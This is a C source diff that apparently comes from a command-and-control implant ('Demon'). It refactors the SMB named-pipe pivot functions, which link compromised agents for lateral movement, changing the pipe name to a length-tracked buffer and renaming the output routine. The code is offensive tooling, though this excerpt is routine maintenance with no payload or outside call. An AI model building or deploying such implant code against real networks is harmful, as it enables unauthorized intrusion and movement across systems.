@@ -21,12 +21,12 @@
  * pivot order.
  */
 
-BOOL PivotAdd( LPWSTR NamedPipe, PVOID* Output, PSIZE_T BytesSize )
+BOOL PivotAdd( BUFFER NamedPipe, PVOID* Output, PSIZE_T BytesSize )
 {
     PPIVOT_DATA Data    = NULL;
     HANDLE      Handle  = NULL;
 
-    Handle = Instance.Win32.CreateFileW( NamedPipe, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL );
+    Handle = Instance.Win32.CreateFileW( NamedPipe.Buffer, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL );
 
     if ( ! Handle )
     {
@@ -36,7 +36,7 @@ BOOL PivotAdd( LPWSTR NamedPipe, PVOID* Output, PSIZE_T BytesSize )
 
     if ( NtGetLastError() == ERROR_PIPE_BUSY )
     {
-        if ( ! Instance.Win32.WaitNamedPipeW( NamedPipe, 5000 ) )
+        if ( ! Instance.Win32.WaitNamedPipeW( NamedPipe.Buffer, 5000 ) )
         {
             return FALSE;
         }
@@ -77,13 +77,12 @@ BOOL PivotAdd( LPWSTR NamedPipe, PVOID* Output, PSIZE_T BytesSize )
     {
         PRINTF( "Pivot :: Output[%p] Size[%d]\n", *Output, *BytesSize )
 
-        Data              = Instance.Win32.LocalAlloc( LPTR, sizeof( PIVOT_DATA ) );
-        Data->PipeName    = NamedPipe;
-        Data->Handle      = Handle;
-        Data->Next        = NULL;
-        Data->DemonID     = PivotParseDemonID( *Output, *BytesSize );
-        Data->PipeName    = Instance.Win32.LocalAlloc( LPTR, StringLengthW( NamedPipe ) * 2 );
-        MemCopy( Data->PipeName, NamedPipe, StringLengthW( NamedPipe ) * 2 );
+        Data                  = Instance.Win32.LocalAlloc( LPTR, sizeof( PIVOT_DATA ) );
+        Data->Handle          = Handle;
+        Data->Next            = NULL;
+        Data->DemonID         = PivotParseDemonID( *Output, *BytesSize );
+        Data->PipeName.Buffer = Instance.Win32.LocalAlloc( LPTR, NamedPipe.Length );
+        MemCopy( Data->PipeName.Buffer, NamedPipe.Buffer, NamedPipe.Length );
 
         if ( ! Instance.SmbPivots )
         {
@@ -148,10 +147,10 @@ BOOL PivotRemove( DWORD AgentId )
     {
         PPIVOT_DATA TempNext = Instance.SmbPivots->Next;
 
-        if ( Instance.SmbPivots->PipeName )
+        if ( Instance.SmbPivots->PipeName.Buffer )
         {
-            MemSet( Instance.SmbPivots->PipeName, 0, StringLengthA( Instance.SmbPivots->PipeName ) );
-            Instance.Win32.LocalFree( Instance.SmbPivots->PipeName );
+            MemSet( Instance.SmbPivots->PipeName.Buffer, 0, Instance.SmbPivots->PipeName.Length );
+            Instance.Win32.LocalFree( Instance.SmbPivots->PipeName.Buffer );
         }
 
         if ( Instance.SmbPivots->Handle )
@@ -160,9 +159,9 @@ BOOL PivotRemove( DWORD AgentId )
             Instance.Win32.NtClose( Instance.SmbPivots->Handle );
         }
 
-        Instance.SmbPivots->PipeName = NULL;
-        Instance.SmbPivots->Handle   = NULL;
-        Instance.SmbPivots->DemonID  = 0;
+        Instance.SmbPivots->PipeName.Buffer = NULL;
+        Instance.SmbPivots->Handle          = NULL;
+        Instance.SmbPivots->DemonID         = 0;
 
         MemSet( Instance.SmbPivots, 0, sizeof( PIVOT_DATA ) );
         Instance.Win32.LocalFree( Instance.SmbPivots );
@@ -179,10 +178,10 @@ BOOL PivotRemove( DWORD AgentId )
             {
                 TempList->Next = PivotData->Next;
 
-                if ( PivotData->PipeName )
+                if ( PivotData->PipeName.Buffer )
                 {
-                    MemSet( PivotData->PipeName, 0, StringLengthA( PivotData->PipeName ) );
-                    Instance.Win32.LocalFree( PivotData->PipeName );
+                    MemSet( PivotData->PipeName.Buffer, 0, PivotData->PipeName.Length );
+                    Instance.Win32.LocalFree( PivotData->PipeName.Buffer );
                 }
 
                 if ( PivotData->Handle )
@@ -191,9 +190,9 @@ BOOL PivotRemove( DWORD AgentId )
                     Instance.Win32.NtClose( PivotData->Handle );
                 }
 
-                PivotData->PipeName = NULL;
-                PivotData->Handle   = NULL;
-                PivotData->DemonID  = 0;
+                PivotData->PipeName.Buffer = NULL;
+                PivotData->Handle          = NULL;
+                PivotData->DemonID         = 0;
 
                 MemSet( PivotData, 0, sizeof( PIVOT_DATA ) );
                 Instance.Win32.LocalFree( PivotData );
@@ -227,7 +226,7 @@ DWORD PivotCount()
     return Counter;
 }
 
-VOID PivotCollectOutput()
+VOID PivotPush()
 {
     PPACKAGE    Package   = NULL;
     PPIVOT_DATA TempList  = Instance.SmbPivots;
